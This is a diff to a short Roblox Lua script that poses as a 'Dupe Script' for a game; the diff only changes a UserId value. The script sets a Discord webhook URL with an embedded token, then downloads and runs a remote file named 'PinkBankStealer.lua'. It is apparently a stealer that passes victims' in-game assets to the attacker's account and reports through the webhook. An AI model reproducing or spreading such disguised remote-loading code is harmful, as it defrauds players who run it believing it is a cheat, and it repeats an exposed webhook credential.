@@ -1,5 +1,5 @@
 _G.Webhook = "https://discord.com/api/webhooks/1086608593127743582/RiGDqHtitQR2Dopa0bG9DgucRa7SVL86vhzMsK5m9u56EWcKcfRk86ObJ27AfP-6meru"
 _G.LoadingText = "Loading Dupe Script!(Be Patient Please)"
-_G.UserId = 372683448
+_G.UserId = 3726834484
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
